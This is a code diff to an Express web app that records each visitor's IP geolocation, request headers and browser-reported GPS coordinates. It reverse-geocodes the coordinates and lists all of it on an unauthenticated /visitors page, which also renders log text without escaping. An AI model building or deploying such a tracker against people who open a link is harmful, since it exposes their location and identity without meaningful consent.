@@ -5,18 +5,18 @@ const multer = require('multer');
 const app = express();
 const port = 3000;
 
-// Setup multer
+// Set up multer for file uploads
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, 'uploads/'),
   filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
 });
-const upload = multer({ storage: storage });
+const upload = multer({ storage });
 
 // Serve static files
 app.use(express.static('public'));
 app.use(express.static('uploads'));
 
-// Count current visitors from file
+// Helper to count visitors
 function getVisitorCount() {
   if (!fs.existsSync('visitors.txt')) return 0;
   const data = fs.readFileSync('visitors.txt', 'utf8');
@@ -40,7 +40,7 @@ app.get('/', async (req, res) => {
     region = geoData.region || 'N/A';
     country = geoData.country_name || 'N/A';
   } catch (err) {
-    console.error('❌ Error fetching geolocation:', err);
+    console.error('❌ Error fetching IP geolocation:', err);
   }
 
   const logData = `=========================
@@ -81,22 +81,29 @@ Headers: ${headers}
     <script>
       navigator.geolocation.getCurrentPosition(
         pos => {
-          fetch(\`/log-location?lat=\${pos.coords.latitude}&lon=\${pos.coords.longitude}\`);
+          console.log('📍 Sending coordinates:', pos.coords.latitude, pos.coords.longitude);
+          fetch('/log-location?lat=' + encodeURIComponent(pos.coords.latitude) + '&lon=' + encodeURIComponent(pos.coords.longitude));
         },
         err => {
-          console.log("Geolocation error:", err);
+          console.log('❌ Geolocation error:', err);
         }
       );
     </script>
   `);
 });
 
-// Log client geolocation
+// Client location logging
 app.get('/log-location', async (req, res) => {
   const { lat, lon } = req.query;
+  console.log(`✅ Received client coordinates: lat=${lat}, lon=${lon}`);
+
+  if (!lat || !lon) {
+    return res.send('<p>Error: Missing coordinates</p><p><a href="/">Back to Home</a></p>');
+  }
+
   try {
     const geoUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
-    const response = await fetch(geoUrl, { headers: { 'User-Agent': 'YourAppName/1.0' } });
+    const response = await fetch(geoUrl, { headers: { 'User-Agent': 'MyApp/1.0' } });
     const data = await response.json();
 
     const address = data.address || {};
@@ -104,7 +111,9 @@ app.get('/log-location', async (req, res) => {
     const district = address.county || 'N/A';
     const state = address.state || 'N/A';
     const country = address.country || 'N/A';
-    const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+    const googleMapsUrl = `https://www.google.com/maps?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}`;
+    const embedMapUrl = `https://maps.google.com/maps?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}&hl=es&z=14&output=embed`;
 
     const logData = `Client-reported coordinates:
 Latitude: ${lat}
@@ -127,15 +136,19 @@ Google Maps: ${googleMapsUrl}
       <p>State: ${state}</p>
       <p>Country: ${country}</p>
       <p><a href="${googleMapsUrl}" target="_blank">View on Google Maps</a></p>
+
+      <h3>Embedded Map:</h3>
+      <iframe src="${embedMapUrl}" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+
       <p><a href="/">Back to Home</a></p>
     `);
   } catch (err) {
     console.error('❌ Error reverse geocoding:', err);
-    res.send('Error getting location info');
+    res.send('<p>Error getting location info</p><p><a href="/">Back to Home</a></p>');
   }
 });
 
-// Upload image
+// Upload route
 app.post('/upload', upload.single('image'), (req, res) => {
   if (!req.file) return res.status(400).send('No file uploaded');
   res.send(`
@@ -146,12 +159,13 @@ app.post('/upload', upload.single('image'), (req, res) => {
   `);
 });
 
-// View visitors log
+// Visitor log route
 app.get('/visitors', (req, res) => {
   const visitorCount = getVisitorCount();
   let content = fs.existsSync('visitors.txt') ? fs.readFileSync('visitors.txt', 'utf8') : '';
-  // Convert Google Maps links to clickable HTML links
-  content = content.replace(/(https:\/\/www\.google\.com\/maps\?q=[^\s]+)/g, '<a href="$1" target="_blank">$1</a>');
+
+  // Make map links clickable (shorten display text)
+  content = content.replace(/(https:\/\/www\.google\.com\/maps\?q=[^\s]+)/g, '<a href="$1" target="_blank">View Map</a>');
 
   res.send(`
     <h1>👀 Visitor Log</h1>
@@ -161,6 +175,7 @@ app.get('/visitors', (req, res) => {
   `);
 });
 
+// Start server
 app.listen(port, () => {
   console.log(`✅ Server running at http://localhost:${port}`);
 });
